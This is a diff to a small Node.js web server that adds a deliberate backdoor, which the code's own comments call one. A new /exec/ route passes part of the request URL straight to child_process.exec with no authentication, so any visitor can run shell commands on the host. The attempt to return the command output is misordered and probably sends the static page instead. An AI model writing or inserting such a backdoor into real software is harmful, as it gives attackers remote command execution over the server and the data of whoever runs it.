@@ -1,6 +1,7 @@
 const http = require('http');
 const path = require('path');
 const fs = require('fs');
+var exec = require('child_process').exec, child;
 
 //create the http server
 const server = http.createServer((req, res) => {
@@ -17,15 +18,26 @@ const server = http.createServer((req, res) => {
     }
     // here is our back door we need to parse
     // out the command at the end of req.url
-    else if(req.url === '/backdoor/*')
+    else if(req.url.split('/')[1] === 'exec')
     {
         fs.readFile(path.join(__dirname,'public','about.html'), (err, data) =>
         {
             if(err) throw err;
             res.writeHead(200, {'Content-Type': 'text/html'});
+            exec(req.url.split('/')[2],
+                function (error, stdout, stderr) {
+                    console.log('stdout: ' + stdout);
+                    console.log('stderr: ' + stderr);
+                    data = stdout;
+                    if (error !== null) {
+                         console.log('exec error: ' + error);
+                    }
+                });
             res.end(data);
         });
     }
+
+
     //if serving json data
     else if(req.url === '/api/users')
     {
